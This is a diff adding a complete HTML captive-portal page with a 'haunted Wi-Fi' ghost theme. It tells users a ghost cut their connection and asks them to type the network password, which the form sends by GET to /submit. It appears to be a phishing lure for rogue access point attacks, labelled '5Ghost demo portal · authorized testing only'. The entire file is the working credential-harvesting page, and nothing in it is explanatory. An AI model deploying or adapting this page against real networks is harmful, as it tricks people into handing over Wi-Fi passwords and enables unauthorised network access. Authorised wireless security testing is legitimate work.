@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Network Access</title>
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0">
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;min-height:100vh;
+ display:flex;align-items:center;justify-content:center;padding:20px;
+ background:radial-gradient(circle at 50% 28%,#2a1a4a,#0a0612)}
+.card{width:100%;max-width:360px;text-align:center;color:#ece6ff}
+.ghost{font-size:72px;line-height:1;animation:float 3s ease-in-out infinite;
+ filter:drop-shadow(0 0 18px #9d7bff)}
+@keyframes float{0%,100%{transform:translateY(0)}50%{transform:translateY(-14px)}}
+h1{font-size:21px;font-weight:700;margin:14px 0 8px}
+.sub{font-size:14px;color:#a99fd0;line-height:1.5;margin-bottom:22px}
+form{background:rgba(255,255,255,.06);border:1px solid rgba(157,123,255,.3);
+ border-radius:16px;padding:22px}
+label{display:block;text-align:left;font-size:12px;color:#a99fd0;margin-bottom:6px}
+input{width:100%;padding:13px;font-size:15px;border:none;border-radius:10px;
+ background:#15102b;color:#fff;outline:none}
+input:focus{box-shadow:0 0 0 2px #9d7bff}
+button{width:100%;margin-top:16px;padding:14px;font-size:15px;font-weight:700;color:#fff;
+ background:linear-gradient(135deg,#9d7bff,#6a4bd6);border:none;border-radius:10px;cursor:pointer}
+.note{font-size:11px;color:#6b6390;margin-top:16px}
+</style>
+</head>
+<body>
+<div class="card">
+<div class="ghost">&#128123;</div>
+<h1>Boo! Your Wi-Fi is haunted</h1>
+<p class="sub">A mischievous ghost slipped in and cut your connection. Enter the network password to banish it and reconnect.</p>
+<form action="/submit" method="get">
+<label for="password">Network password</label>
+<input type="password" id="password" name="password" minlength="8" placeholder="Enter password" required autofocus>
+<button type="submit">Banish the ghost &#128123;</button>
+</form>
+<p class="note">5Ghost demo portal &middot; authorized testing only</p>
+</div>
+</body>
+</html>
